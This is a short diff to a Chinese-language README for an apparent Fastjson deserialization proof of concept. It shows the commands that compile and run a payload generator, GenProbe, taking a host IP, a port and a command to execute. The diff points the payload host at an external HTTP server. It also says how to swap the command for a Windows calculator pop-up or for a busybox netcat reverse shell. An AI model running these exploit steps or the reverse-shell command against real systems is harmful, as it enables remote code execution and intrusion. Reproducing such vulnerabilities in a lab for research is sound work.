@@ -23,7 +23,7 @@ docker compose up -d
 javac -cp "poc/lib/*" -d poc poc/GenProbe.java
 
 # 生成（参数: IP 端口 命令）
-java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 127.0.0.1 19090 "touch /tmp/pwned"
+java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe <HTTP托管IP> 19090 "touch /tmp/pwned"
 ```
 
 Windows 弹计算器改最后参数为 `"calc"`，反弹 shell 改为 `"busybox nc <ip> <port> -e bash"`
